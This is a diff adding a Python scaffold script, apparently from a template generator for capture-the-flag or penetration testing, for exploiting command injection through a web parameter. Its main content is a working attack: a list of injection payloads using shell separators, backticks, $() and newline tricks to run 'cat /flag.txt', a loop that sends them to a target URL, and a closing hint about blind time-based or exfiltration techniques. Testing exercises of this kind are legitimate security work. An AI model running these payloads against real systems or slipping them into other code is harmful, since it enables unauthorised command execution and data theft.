@@ -1,0 +1,38 @@
+#!/usr/bin/env python3
+# wbx scaffold: command injection  ({{LOCATION}})
+# Rule: {{RULE}}   Sink: {{SINK}}   Note: {{NOTE}}
+import urllib.parse
+import urllib.request
+
+BASE = "http://TARGET:PORT"   # TODO
+PARAM = "host"                # TODO: param feeding {{SINK}}
+
+# Separators/wrappers to break out of the intended command.
+PAYLOADS = [
+    "127.0.0.1; cat /flag.txt",
+    "127.0.0.1 && cat /flag.txt",
+    "127.0.0.1 | cat /flag.txt",
+    "$(cat /flag.txt)",
+    "`cat /flag.txt`",
+    "127.0.0.1%0acat /flag.txt",   # newline injection
+]
+
+
+def send(payload: str) -> str:
+    url = f"{BASE}/?{urllib.parse.urlencode({PARAM: payload})}"
+    with urllib.request.urlopen(url, timeout=10) as r:
+        return r.read().decode(errors="replace")
+
+
+def main():
+    for p in PAYLOADS:
+        try:
+            body = send(p)
+            print(f"[{'+' if 'flag' in body.lower() else '?'}] {p:<35} len={len(body)}")
+        except Exception as e:
+            print(f"[-] {p:<35} {e}")
+    print("\nNo direct output? Try blind (time-based `sleep 5`, or exfil to a listener you control).")
+
+
+if __name__ == "__main__":
+    main()
